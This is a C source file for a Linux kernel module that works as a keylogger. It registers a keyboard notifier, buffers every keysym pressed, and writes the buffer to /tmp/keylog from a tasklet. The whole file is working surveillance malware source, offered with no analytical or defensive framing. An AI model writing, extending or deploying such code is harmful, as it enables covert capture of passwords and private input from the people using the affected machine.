#include <linux/keyboard.h>
#include <linux/kernel.h>
#include <linux/notifier.h>
#include <linux/fs.h>
#include <linux/interrupt.h>

#include "include/keyboard.h"

#define KEY_BUFF_LEN 512
static char key_buffer[KEY_BUFF_LEN];
static const char *filename = "/tmp/keylog";

static loff_t file_position;
static size_t buff_position;
static struct file *fp;

static struct notifier_block keylogger_nb = {
	.notifier_call = key_pressed
};

static int write_buff_to_file(void) {
	size_t nbytes;

	fp = filp_open(filename, O_RDWR | O_CREAT, S_IWUSR | S_IRUSR);
	if (IS_ERR(fp)) {
		return -1;
	}

	nbytes = kernel_write(fp, key_buffer, KEY_BUFF_LEN, &file_position);
	filp_close(fp, NULL);

	return 0;
}

static void handle_full_buffer(long unsigned int _n) {
	write_buff_to_file();
	buff_position = 0;
}

DECLARE_TASKLET_OLD(full_buff, handle_full_buffer);

int key_pressed(struct notifier_block *nb, unsigned long action, void *data) {
	struct keyboard_notifier_param *param = data;

	if (KBD_KEYSYM == action && param->down == 1) {
		char key = param->value;
		key_buffer[buff_position++] = key;
		if (buff_position == KEY_BUFF_LEN - 1) {
			key_buffer[buff_position] = '\0';
			tasklet_schedule(&full_buff);
		}
	} 

	return NOTIFY_OK;
}

void keyboard_init(void) {
	buff_position = 0;
	file_position = 0;

	register_keyboard_notifier(&keylogger_nb);
}

void keyboard_cleanup(void) {
	unregister_keyboard_notifier(&keylogger_nb);
}

